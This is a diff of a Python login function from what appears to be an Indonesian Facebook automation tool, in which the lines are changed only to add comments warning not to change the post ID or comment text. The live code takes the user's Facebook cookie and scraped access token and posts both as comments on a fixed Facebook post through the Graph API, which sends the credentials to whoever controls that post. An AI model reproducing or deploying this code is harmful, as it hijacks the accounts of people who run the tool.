@@ -236,14 +236,14 @@ def login():
 		jam      = datetime.now().strftime("%X")
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		tem      = ('\nPanutan Gw Nih Boss😎 @[100056190665450:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
+		tem      = ('\nPanutan Gw Nih Boss😎 @[100056190665450:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n') ###--------[ JANGAN GANTI KOMENNYA ]--------###
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://www.facebook.com/photo?fbid=661200275762989&set=a.111112804105075')
-		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Kamu Ganteng Banget Deh Ferly><😝"])
+		link = ('https://www.facebook.com/photo?fbid=661200275762989&set=a.111112804105075') ###--------[ JANGAN GANTI ID NYA ]--------###
+		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Kamu Ganteng Banget Deh Ferly><😝"]) ###--------[ JANGAN GANTI KOMENNYA ]--------###
 		#ses.post(f"https://graph.facebook.com/661200275762989?fields=subscribers&access_token={token}",headers=(cookies=cok)
-		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={cookie}&access_token={token}",cookies=cok)
-		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={token}&access_token={token}",cookies=cok)
-		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
+		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={cookie}&access_token={token}",cookies=cok) ###--------[ JANGAN GANTI ID NYA ]--------###
+		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={token}&access_token={token}",cookies=cok) ###--------[ JANGAN GANTI ID NYA ]--------###
+		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ###--------[ JANGAN GANTI ID NYA ]--------###
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
